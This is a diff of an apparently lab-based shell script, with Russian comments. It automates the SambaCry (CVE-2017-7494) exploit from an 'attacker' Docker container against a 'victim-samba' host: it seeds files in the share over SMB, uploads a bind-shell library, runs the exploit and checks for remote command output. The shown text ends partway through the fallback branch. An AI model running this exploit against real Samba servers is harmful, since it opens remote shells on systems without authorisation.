@@ -34,18 +34,29 @@ docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/a
 echo "Зависимости установлены"
 
 echo ""
+echo "=== Шаг 5.5: Инициализация тестовых данных в SMB share ==="
+echo "Создание тестовых файлов в myshare для активации Samba..."
+# Создаем тестовые файлы в SMB share через smbclient
+docker exec attacker bash -c "echo 'test file for SambaCry exploit' | smbclient //172.20.0.104/myshare -N -c 'put - test_init.txt'" || echo "Не удалось создать тестовый файл (это нормально, если share пустой)"
+docker exec attacker bash -c "smbclient //172.20.0.104/myshare -N -c 'ls'" || echo "Не удалось проверить содержимое share"
+echo "Тестовые данные инициализированы"
+
+echo ""
 echo "=== Шаг 6: Запуск эксплойта CVE-2017-7494 ==="
 echo "Эксплуатация SambaCry на 172.20.0.104..."
 # Запускаем эксплойт и перехватываем вывод
-EXPLOIT_OUTPUT=$(docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/activate && timeout 25 ./exploit.py -t 172.20.0.104 -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699" 2>&1 || echo "")
+# Используем более длинный таймаут и сохраняем весь вывод
+EXPLOIT_OUTPUT=$(docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/activate && timeout 30 ./exploit.py -t 172.20.0.104 -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699 2>&1" || echo "")
 
-# Выводим вывод эксплойта (игнорируем ошибки потоков в конце)
-echo "$EXPLOIT_OUTPUT" | grep -v "Exception in thread\|Traceback\|AttributeError\|__bootstrap_inner\|File \"/usr/lib/python2.7" | head -15
+# Выводим вывод эксплойта (игнорируем ошибки потоков в конце, но сохраняем важные строки)
+echo "$EXPLOIT_OUTPUT" | grep -vE "Exception in thread|Traceback|AttributeError|__bootstrap_inner|File \"/usr/lib/python2.7|most likely raised during interpreter shutdown" | head -20
 
 # Проверяем, удалось ли эксплойту подключиться
-if echo "$EXPLOIT_OUTPUT" | grep -q ">>Linux\|>>victim-samba"; then
+# Ищем строки с выводом команд (начинаются с >>)
+if echo "$EXPLOIT_OUTPUT" | grep -qE ">>Linux|>>victim-samba|>>.*Linux|>>.*kernel"; then
     # Если в выводе эксплойта уже есть результат, выводим его
-    echo "$EXPLOIT_OUTPUT" | grep -A 2 ">>Linux" | head -3
+    echo ""
+    echo "$EXPLOIT_OUTPUT" | grep -E "^>>|^hostname" | head -5
 else
     # Пробуем подключиться к bind shell вручную
     echo ""
